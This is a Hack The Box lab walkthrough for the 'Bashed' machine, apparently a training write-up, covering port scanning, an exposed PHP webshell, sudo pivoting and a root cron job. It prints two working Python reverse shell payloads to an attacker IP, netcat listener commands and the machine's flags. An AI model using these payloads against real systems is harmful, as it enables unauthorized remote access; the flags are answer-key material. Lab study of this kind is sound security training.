# Bashed

<div align="left"><figure><img src="../.gitbook/assets/image (2) (1).png" alt="" width="75"><figcaption><p>hackthebox.com - © HACKTHEBOX</p></figcaption></figure></div>

🔗 [Bashed](https://www.hackthebox.com/machines/bashed)

### Task 1 - Deploy the machine

🎯 Target IP: `10.129.236.215`

Create a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine, including the scans made with nmap.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
echo "10.129.236.215 bashed.htb" >> /etc/hosts

mkdir -p htb/bashed.htb
cd htb/bashed.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 bashed.htb
PING bashed.htb (10.129.236.215) 56(84) bytes of data.
64 bytes from bashed.htb (10.129.236.215): icmp_seq=1 ttl=63 time=67.3 ms
64 bytes from bashed.htb (10.129.236.215): icmp_seq=2 ttl=63 time=64.2 ms
64 bytes from bashed.htb (10.129.236.215): icmp_seq=3 ttl=63 time=79.4 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target should be a \*nix system, while Windows systems usually have a TTL of 128 secs.

### 2.1 - How many open TCP ports are listening on Bashed??

```bash
nmap -p0- -sS -Pn -vvv bashed.htb -oN nmap/tcp_port_scan
```

```bash
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sS</td><td>SynScan</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there's 1 open TCP port on the machine: 80

{% hint style="info" %}
1
{% endhint %}

### 2.2 - What is the relative path on the webserver to a folder that contains phpbash.php??

Now, we take more precise scan utilizing -sCV flags to retrieve versioning services and test common scripts.

```bash
nmap -p80 -sS -Pn -n -v -sCV -T4 bashed.htb -oG nmap/port_scan
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
|_http-favicon: Unknown favicon MD5: 6AA5034A553DFA77C3B2C7B4C26CF870
```

#### Port 80

Browsing webserver on port 80 via browser, that contains a web php bash.

<figure><img src="../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

Analyzing source code we don't found nothing of interesting, than we can discover more info about website using whatweb and do directory enumeration using gobuster.

```bash
whatweb bashed.htb
http://bashed.htb [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.236.215], JQuery, Meta-Author[Colorlib], Script[text/javascript], Title[Arrexel's Development Site]
```

```
gobuster dir -u http://bashed.htb -w /usr/share/wordlists/dirb/common.txt
```

<div align="left"><figure><img src="../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure></div>

Very good, we've found interisting web dir such as /dev and /uploads, exploring them we can answer at our question.

<figure><img src="../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
/dev
{% endhint %}

### 2.3 - What user is the webserver running as on Bashed?

The /dev directory contains two php webshell, more probably phpbash.min.php is a minimal bash or beta version while phpbash.php is full version.

In both cases, we immediately observe that the user in use is the same.

<figure><img src="../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
www-data
{% endhint %}

### Task 3 - Find user flag

### 3.1 - Submit the flag located in the arrexel user's home directory.

Navigating into file system is more simple discover users home directories and arrexel user's flag.

<figure><img src="../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

b2e6af7c997eba350b6cf95ad88240cb

</details>

### 3.2 - www-data can run any command as a user without a password. What is that user's username?

Using sudo -l we can see that www-data can run all commands on bashed as a user scriptmanager.

<figure><img src="../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
scriptmanager
{% endhint %}

### 3.3 - What folder in the system root can scriptmanager access that www-data could not?

Going into root dir / we can launch ls -l and see all permissions regarding directories.

<div align="left"><figure><img src="../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure></div>

{% hint style="info" %}
/scripts
{% endhint %}

### 3.4 - What is filename of the file that is being run by root every couple minutes?

"Every couple minutes" is an hint to understand possibile route.

But, we decide to give a reverse shell on our attacker machine to optimize our work, to do it we need to make us in listening mode using netcat `nc -lvnp 1339` and execute a python script on web shell.

```python
export RHOST="10.10.14.6";export RPORT=1339;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

<div align="left"><figure><img src="../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure></div>

Remembering the question's hint and the last task, where only the scriptmanager can access the /scripts folder, we can access it as the scriptmanager user spawning a a bash shell

```bash
sudo -u scriptmanager python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Trying to use sudo -l commands, the system asks us for a password that we don't know.

Now, we've permissions access to /scripts dir, where we found two files:

<div align="left"><figure><img src="../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure></div>

Additionally, the program `test.py` appears to be scheduled to execute almost every minute, based on the last access time of `test.txt`. From this, we can infer that there may be a cron job owned by root that automatically runs `test.py` every minute. We can confirm this by renaming `test.txt` (e.g., to `test.txt.old`) and observing that a new `test.txt` file is created after a minute or so."

This is useful because we can modify the contents of `test.py` to include reverse shell code, which would then execute with root privileges.

Next, let's create a new file named `test.py` on our Kali box and insert the same reverse shell code we used earlier. We'll then transfer this file to the target 'Bashed' machine.

```python
echo "import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('10.10.14.6',4444));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(['/bin/sh','-i']);" > test.py
```

{% hint style="info" %}
test.py
{% endhint %}

### Task 4 - Find root flag

### 4.1 - Submit the flag located in root's home directory.

Immediately before or at least within two minutes we listen with netcat on the attacker machine, and we obtain a shell with root permissions.

<div align="left"><figure><img src="../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure></div>

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

40ca417765210f39b12b2d78813ebcfe

</details>
